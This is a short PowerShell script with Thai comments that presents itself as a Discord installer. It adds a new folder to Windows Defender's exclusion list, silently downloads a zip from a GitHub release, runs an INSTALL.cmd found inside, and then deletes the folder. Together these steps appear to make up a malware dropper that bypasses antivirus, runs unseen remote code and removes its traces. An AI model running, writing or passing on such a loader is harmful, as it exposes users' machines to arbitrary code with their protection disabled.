# 1. บังคับใช้ TLS 1.2 เพื่อความเร็วและความเสถียรสูงสุด
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 2. สร้างโฟลเดอร์เป้าหมาย
$path = "C:\phwyverysad"
if (!(Test-Path $path)) { New-Item -Path $path -ItemType Directory -Force }

# 3. เพิ่มข้อยกเว้น Windows Defender (Exclusion Path)
Add-MpPreference -ExclusionPath $path

# 4. ตั้งค่าตัวแปรและปิด Progress Bar เพื่อลดการใช้ทรัพยากร UI
$url = "https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/Discord.zip"
$zip = "$path\Discord.zip"
$oldProgress = $ProgressPreference
$ProgressPreference = 'SilentlyContinue'

# 5. ใช้ .NET WebClient ดาวน์โหลดแบบ Synchronous
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $zip)

# 6. คืนค่า Progress Bar และทำการแตกไฟล์
$ProgressPreference = $oldProgress
Expand-Archive -Path $zip -DestinationPath $path -Force

# 7. ค้นหาไฟล์ INSTALL.cmd ในโฟลเดอร์ที่แตกมาและสั่งรันแบบรอจนกว่าจะปิด (Wait)
$cmd = Get-ChildItem -Path $path -Filter "INSTALL.cmd" -Recurse | Select-Object -First 1
if ($cmd) {
    Start-Process -FilePath $cmd.FullName -WorkingDirectory $cmd.DirectoryName -Wait
}

# 8. ลบโฟลเดอร์ทิ้งทันทีหลังจาก INSTALL.cmd ปิดตัวลง
Remove-Item -Path $path -Recurse -Force
